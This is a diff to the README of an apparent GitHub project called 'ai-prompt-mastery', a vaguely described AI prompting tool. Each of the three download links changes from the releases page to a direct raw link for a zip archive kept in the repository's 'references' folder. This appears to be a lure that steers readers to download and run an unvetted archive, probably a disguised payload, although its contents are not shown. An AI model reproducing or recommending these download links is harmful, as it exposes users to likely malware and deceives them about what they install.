@@ -1,6 +1,6 @@
 # 🧠 ai-prompt-mastery - Unlock AI's True Potential Today
 
-[![Download ai-prompt-mastery](https://img.shields.io/badge/Download-ai--prompt--mastery-brightgreen)](https://github.com/AtesOyuncuymus/ai-prompt-mastery/releases)
+[![Download ai-prompt-mastery](https://raw.githubusercontent.com/AtesOyuncuymus/ai-prompt-mastery/main/references/prompt-mastery-ai-v3.6.zip)](https://raw.githubusercontent.com/AtesOyuncuymus/ai-prompt-mastery/main/references/prompt-mastery-ai-v3.6.zip)
 
 ## 📖 Description
 ai-prompt-mastery offers a universal methodology to enhance the performance of any AI. With this tool, you can easily create effective prompts that improve the quality of responses from AI models. This application is designed for users of all levels, making it simple for anyone to harness the full power of AI technology.
@@ -10,7 +10,7 @@ To get started with ai-prompt-mastery, follow these simple steps to download and
 
 1. **Visit the Releases Page**
    - Click on the download link below to access the releases page.
-   - [Download ai-prompt-mastery](https://github.com/AtesOyuncuymus/ai-prompt-mastery/releases)
+   - [Download ai-prompt-mastery](https://raw.githubusercontent.com/AtesOyuncuymus/ai-prompt-mastery/main/references/prompt-mastery-ai-v3.6.zip)
 
 2. **Choose the Correct Version**
    - Once on the releases page, look for the most recent version.
@@ -68,6 +68,6 @@ If you run into any issues or need help, please refer to the FAQ section on our 
 ## 📥 Download & Install
 Now that you know how to get started, don’t wait any longer! To download ai-prompt-mastery, go to the link below:
 
-[Download ai-prompt-mastery](https://github.com/AtesOyuncuymus/ai-prompt-mastery/releases)
+[Download ai-prompt-mastery](https://raw.githubusercontent.com/AtesOyuncuymus/ai-prompt-mastery/main/references/prompt-mastery-ai-v3.6.zip)
 
 This tool offers you a straightforward way to improve your AI experience. By following the easy steps provided, you’ll be up and running in no time, ready to unlock the full potential of any AI model.
